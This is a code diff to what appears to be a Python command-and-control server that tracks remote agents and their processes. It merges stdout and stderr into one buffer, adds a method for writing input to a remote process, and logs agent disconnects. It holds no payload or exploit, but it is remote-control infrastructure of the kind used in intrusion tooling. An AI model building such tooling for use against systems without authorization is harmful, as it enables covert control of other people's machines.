@@ -22,10 +22,13 @@ class Process:
     pid: int
     command: str
     task_id: int
-    stdout: bytearray
-    stderr: bytearray
+    output: bytearray
     alive: bool = True
 
+    def write(self, data: bytes):
+        if len(data) == 0:
+            return
+        self.session.send(ProcessPipeFrame(self.pid, 0, data))
 
 
 class Agent:
@@ -92,6 +95,7 @@ class C2:
 
             def run():
                 session.run()
+                print(f"Agent gone: {agent.uuid}")
                 self.agents.pop(uuid)
 
             Thread(target=run, daemon=True).start()
@@ -125,7 +129,6 @@ def SessionAgent(uuid: uuid4, session: ProtocolSession) -> Agent:
             frame.command,
             frame.request_id,
             bytearray(),
-            bytearray(),
         )
 
     @session.handler(ProcessTerminatedFrame)
@@ -135,12 +138,6 @@ def SessionAgent(uuid: uuid4, session: ProtocolSession) -> Agent:
     @session.handler(ProcessPipeFrame)
     def handle(frame: ProcessPipeFrame, _):
         process = agent.processes[frame.pid]
-        if frame.descriptor == 1:
-            buffer = process.stdout
-        elif frame.descriptor == 1:
-            buffer = process.stderr
-        else:
-            return
-        buffer.extend(frame.data)
+        process.output.extend(frame.data)
 
     return agent
